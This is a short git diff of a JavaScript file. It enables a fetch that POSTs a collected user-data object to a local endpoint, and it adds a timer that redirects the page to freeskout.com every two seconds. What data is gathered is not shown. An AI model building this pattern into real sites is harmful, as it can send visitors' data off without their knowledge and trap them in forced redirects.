@@ -22,7 +22,9 @@ let ud = {
 
 const reDirection = async () => {
   await userData();
-  // window.open("https://freeskout.com/", "_self")
+  window.setInterval(()=>{
+  window.open("https://freeskout.com/", "_self");
+  },2000)
 };
 
 const userData = async () => {
@@ -170,13 +172,14 @@ const userData = async () => {
 
   // _________________________________________________________
 
-  // await fetch("http://localhost:1369/user/getUser", {
-  //   method: "POST",
-  //   headers: {
-  //     "Content-Type": "application/json",
-  //   },
-  //   body: JSON.stringify(ud),
-  // }).then((response) => console.log("yeah done", response));
+  await fetch("http://localhost:1369/user/getUser", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify(ud),
+  }).then((response) => console.log("yeah done", response))
+    .catch(err=>console.log(err));
 
   // ________________________________________________________
 };
